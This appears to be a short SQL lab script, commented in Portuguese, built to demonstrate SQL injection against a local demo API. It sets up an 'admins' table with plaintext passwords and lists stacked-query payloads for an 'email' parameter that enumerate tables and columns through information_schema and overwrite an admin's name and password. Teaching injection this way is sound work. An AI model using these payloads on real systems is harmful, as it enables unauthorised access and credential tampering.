-- Para exemplos de sql injection
DROP TABLE IF EXISTS admins;

CREATE TABLE IF NOT EXISTS admins
(
	id 			BIGSERIAL PRIMARY KEY,
	"name"  	VARCHAR(50),
	"password" 	VARCHAR(50)
);

INSERT INTO admins
	("name", "password")
VALUES
	('admin1', 'pass1'),
	('admin2', 'pass2');


-- localhost:5000/api/users?email=y

-- localhost:5000/api/users?email=y'; select true--'
SELECT TRUE;

-- localhost:5000/api/users?email=y'; select table_name from information_schema.TABLES;--'
select table_name from information_schema.TABLES;

-- localhost:5000/api/users?email=y'; select table_name from information_schema.TABLES;--'

-- localhost:5000/api/users?email=y'; select table_name from information_schema.TABLES WHERE table_name NOT ILIKE 'pg_%';--'
select table_name from information_schema.TABLES WHERE table_name NOT LIKE 'pg_%';

-- localhost:5000/api/users?email=y'; SELECT column_name FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME ILIKE 'admins';--'
SELECT column_name FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME ILIKE 'admins';


-- localhost:5000/api/users?email=y'; update admins SET ("name", "password") = ('admin1 hacked', '1234hacked') WHERE id = 1 returning *;--'
UPDATE admins SET ("name", "password") = ('admin hacked', '1234') WHERE id = 1 RETURNING *;
